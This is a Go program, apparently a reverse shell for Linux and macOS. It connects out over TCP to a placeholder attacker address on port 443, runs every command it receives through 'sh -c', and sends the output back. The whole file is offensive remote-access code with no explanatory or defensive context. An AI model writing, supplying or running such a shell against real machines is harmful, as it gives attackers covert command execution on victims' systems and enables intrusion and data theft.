// Linux/macOS
package main

import (
    "fmt"
    "net"
    "os/exec"
    "strings"
    "time"
)

const (
    LHOST = "IP_ADDRESS"
    LPORT = 443
)

func main() {
    // Create TCP socket and connect
    tcpClient, err := net.Dial("tcp", fmt.Sprintf("%s:%d", LHOST, LPORT))
    if err != nil {
        fmt.Printf("Connection error: %v", err)
        return
    }
    defer tcpClient.Close()

    // Set socket to non-blocking to check for data availability
    tcpClient.SetDeadline(time.Now().Add(100 * time.Millisecond))

    var code string
    bufferSize := 1024

    for {
        // Check if data is available
        tcpClient.SetDeadline(time.Now().Add(100 * time.Millisecond))
        data := make([]byte, bufferSize)
        n, err := tcpClient.Read(data)
        if err != nil {
            break
        }

        if n > 0 {
            // Decode the received data
            receivedCode := string(data[:n])
            code += receivedCode

            // Check if we have a complete command (ends with newline)
            if strings.Contains(receivedCode, "\n") {
                // Execute the command
                if strings.TrimSpace(code) != "" {
                    output, err := exec.Command("sh", "-c", code).CombinedOutput()
                    if err != nil {
                        output = []byte(err.Error())
                    }
                    _, err = tcpClient.Write(append(output, '\n'))
                    if err != nil {
                        break
                    }
                    code = ""
                }
            }
        }

        // Check if connection is still alive
        _, err = tcpClient.Write([]byte{})
        if err != nil {
            break
        }

        time.Sleep(100 * time.Millisecond)
    }
}
